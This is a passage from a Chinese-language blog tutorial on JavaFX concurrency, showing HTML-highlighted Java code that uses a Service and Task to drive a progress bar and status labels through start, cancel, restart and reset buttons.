class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">startBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;开始&quot;</span>);<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">cancelBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;取消&quot;</span>);<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">restartBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;重启&quot;</span>);<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">resetBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;重置&quot;</span>);<br><br>    <span class="hljs-type">ProgressBar</span> <span class="hljs-variable">progressBar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProgressBar</span>(<span class="hljs-number">0</span>);<br>    progressBar.setPrefWidth(<span class="hljs-number">200</span>);<br><br>    <span class="hljs-type">Label</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;state&quot;</span>);<br>    <span class="hljs-type">Label</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;value&quot;</span>);<br>    <span class="hljs-type">Label</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;title&quot;</span>);<br>    <span class="hljs-type">Label</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;message&quot;</span>);<br><br>    <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>();<br>    hBox.setAlignment(Pos.CENTER);<br>    hBox.setSpacing(<span class="hljs-number">10.0</span>);<br><br>    hBox.getChildren().addAll(startBt, cancelBt, restartBt, resetBt, progressBar, l1, l2, l3, l4);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #7bb9b0;&quot;</span>);<br>    anchorPane.getChildren().add(hBox);<br><br>    AnchorPane.setLeftAnchor(hBox, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setTopAnchor(hBox, <span class="hljs-number">100.0</span>);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>    primaryStage.setScene(scene);<br>    primaryStage.setTitle(<span class="hljs-string">&quot;javaFX&quot;</span>);<br>    primaryStage.setWidth(<span class="hljs-number">700</span>);<br>    primaryStage.setHeight(<span class="hljs-number">500</span>);<br>    primaryStage.show();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004144041677.png" alt="image-20221004144041677"></p><p>新建一个任务类，继承于<code>Service</code>，需要实现<code>createTask</code>方法，返回的是<code>Task</code>，所以需要实例化一个<code>Task</code>作为返回值，<code>Task</code>的内容与上一节相同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Service</span>&lt;Number&gt;&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Task&lt;Number&gt; <span class="hljs-title function_">createTask</span><span class="hljs-params">()</span> &#123;<br>        Task&lt;Number&gt; task = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">// 任务名称</span><br>                <span class="hljs-built_in">this</span>.updateTitle(<span class="hljs-string">&quot;任务名称&quot;</span>);<br><br>                <span class="hljs-type">double</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br>                <span class="hljs-type">Random</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>                <span class="hljs-type">double</span> <span class="hljs-variable">cur</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-type">double</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">while</span> (cur &lt; sum) &#123;<br>                    cur = cur + rand.nextInt(<span class="hljs-number">100</span>);<br>                    <span class="hljs-keyword">if</span> (cur &gt; sum) &#123;<br>                        cur = sum;<br>                    &#125;<br>                    progress = cur / sum;<br>                    <span class="hljs-comment">// System.out.println(progress);</span><br><br>                    <span class="hljs-built_in">this</span>.updateProgress(cur, sum);<br><br>                    <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.5</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;请耐性等待&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.8</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;马上就好&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;即将完成&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;完成了!&quot;</span>);<br>                    &#125;<br><br><br>                    Thread.sleep(<span class="hljs-number">200</span>);<br><br>                    <span class="hljs-keyword">if</span> (isCancelled())&#123;<br>                        <span class="hljs-comment">// 任务取消需要在这里另外判断一下</span><br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> progress;<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-keyword">return</span> task;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后就可以实例化任务类，并绑定按钮事件了，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyService</span> <span class="hljs-variable">myService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyService</span>();<br><br><span class="hljs-comment">// 开始事件</span><br>startBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myService.start();<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 取消事件</span><br>cancelBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myService.cancel();<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 重启事件</span><br>restartBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myService.restart();<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 重置事件</span><br>resetBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        myService.reset();<br>        <span class="hljs-comment">// 进度条归零</span><br>        progressBar.setProgress(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>对任务设置一些监听事件，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 任务进度监听</span><br>myService.progressProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        progressBar.setProgress(newValue.doubleValue());<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 消息监听</span><br>myService.messageProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String&gt; observable, String oldValue, String newValue)</span> &#123;<br>        <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span>)&#123;<br>            l4.setText(newValue);<br>        &#125;<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 返回值监听</span><br>myService.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span> &amp;&amp; newValue.doubleValue() == <span class="hljs-number">1</span>)&#123;<br>            l2.setText(<span class="hljs-string">&quot;完成&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>最终效果，可以通过<code>开始</code>按钮开始任务，<code>取消</code>按钮取消任务，<code>重启</code>按钮重启任务，<code>重置</code>按钮重置任务，取消的任务不能通过<code>开始</code>再次启动，需要通过<code>重启</code>，或者<code>重置</code>后<code>开始</code>。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004144119224.png" alt="image-20221004144119224"></p><p><code>Service</code>还可以添加任务某个状态的监听事件（<code>Task</code>类也可以的），比如<code>Running</code>状态的监听事件，当任务进入<code>Running</code>状态或离开<code>Running</code>状态时会触发该事件，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">myService.runningProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Boolean&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Boolean&gt; observable, Boolean oldValue, Boolean newValue)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Running &quot;</span> + newValue);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>最后的代码，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> javafxTask;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.beans.value.ChangeListener;<br><span class="hljs-keyword">import</span> javafx.beans.value.ObservableValue;<br><span class="hljs-keyword">import</span> javafx.concurrent.Service;<br><span class="hljs-keyword">import</span> javafx.concurrent.Task;<br><span class="hljs-keyword">import</span> javafx.event.ActionEvent;<br><span class="hljs-keyword">import</span> javafx.event.EventHandler;<br><span class="hljs-keyword">import</span> javafx.geometry.Pos;<br><span class="hljs-keyword">import</span> javafx.scene.Scene;<br><span class="hljs-keyword">import</span> javafx.scene.control.Button;<br><span class="hljs-keyword">import</span> javafx.scene.control.Label;<br><span class="hljs-keyword">import</span> javafx.scene.control.ProgressBar;<br><span class="hljs-keyword">import</span> javafx.scene.layout.AnchorPane;<br><span class="hljs-keyword">import</span> javafx.scene.layout.HBox;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fxService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Button</span> <span class="hljs-variable">startBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;开始&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">cancelBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;取消&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">restartBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;重启&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">resetBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;重置&quot;</span>);<br><br>        <span class="hljs-type">ProgressBar</span> <span class="hljs-variable">progressBar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProgressBar</span>(<span class="hljs-number">0</span>);<br>        progressBar.setPrefWidth(<span class="hljs-number">200</span>);<br><br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;state&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;value&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;title&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;message&quot;</span>);<br><br>        <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>();<br>        hBox.setAlignment(Pos.CENTER);<br>        hBox.setSpacing(<span class="hljs-number">10.0</span>);<br><br>        hBox.getChildren().addAll(startBt, cancelBt, restartBt, resetBt, progressBar, l1, l2, l3, l4);<br><br>        <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>        anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #7bb9b0;&quot;</span>);<br>        anchorPane.getChildren().add(hBox);<br><br>        AnchorPane.setLeftAnchor(hBox, <span class="hljs-number">100.0</span>);<br>        AnchorPane.setTopAnchor(hBox, <span class="hljs-number">100.0</span>);<br><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>        primaryStage.setScene(scene);<br>        primaryStage.setTitle(<span class="hljs-string">&quot;javaFX&quot;</span>);<br>        primaryStage.setWidth(<span class="hljs-number">700</span>);<br>        primaryStage.setHeight(<span class="hljs-number">500</span>);<br>        primaryStage.show();<br><br>        <span class="hljs-type">MyService</span> <span class="hljs-variable">myService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyService</span>();<br><br>        <span class="hljs-comment">// 开始事件</span><br>        startBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myService.start();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 取消事件</span><br>        cancelBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myService.cancel();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 重启事件</span><br>        restartBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myService.restart();<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 重置事件</span><br>        resetBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                myService.reset();<br>                progressBar.setProgress(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 任务进度监听</span><br>        myService.progressProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                progressBar.setProgress(newValue.doubleValue());<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// 消息监听</span><br>        myService.messageProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String&gt; observable, String oldValue, String newValue)</span> &#123;<br>                <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span>)&#123;<br>                    l4.setText(newValue);<br>                &#125;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// 返回值监听</span><br>        myService.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                <span class="hljs-keyword">if</span> (newValue != <span class="hljs-literal">null</span> &amp;&amp; newValue.doubleValue() == <span class="hljs-number">1</span>)&#123;<br>                    l2.setText(<span class="hljs-string">&quot;完成&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>        myService.runningProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Boolean&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Boolean&gt; observable, Boolean oldValue, Boolean newValue)</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Running &quot;</span> + newValue);<br>            &#125;<br>        &#125;);<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Service</span>&lt;Number&gt;&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Task&lt;Number&gt; <span class="hljs-title function_">createTask</span><span class="hljs-params">()</span> &#123;<br>        Task&lt;Number&gt; task = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">// 任务名称</span><br>                <span class="hljs-built_in">this</span>.updateTitle(<span class="hljs-string">&quot;任务名称&quot;</span>);<br><br>                <span 